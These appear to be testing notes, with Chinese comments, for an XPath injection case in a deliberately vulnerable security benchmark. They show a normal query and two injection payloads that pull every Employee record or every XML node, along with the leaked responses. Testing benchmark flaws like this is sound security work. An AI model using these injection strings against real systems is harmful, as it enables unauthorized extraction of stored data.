# 1. 正常查询
POST /benchmark/xpathi-00/BenchmarkTest00103
Content-Type: application/x-www-form-urlencoded

BenchmarkTest00103=1111

# Response: 返回 emplid=1111 的 John Watson

# 2. XPath 注入 - 提取所有 Employee 元素
POST /benchmark/xpathi-00/BenchmarkTest00103
Content-Type: application/x-www-form-urlencoded

BenchmarkTest00103=1111'] | //Employee | /Employees/Employee[@emplid='

# Response: 一次性返回全部4名员工的所有字段（John Watson, Sherlock Homes, Jim Moriarty, Mycroft Holmes）

# 3. XPath 注入 - 提取全部 XML 节点（含文本节点）
POST /benchmark/xpathi-00/BenchmarkTest00103
Content-Type: application/x-www-form-urlencoded

BenchmarkTest00103=1111'] | //* | /Employees/Employee[@emplid='

# Response: 返回所有 XML 元素的文本内容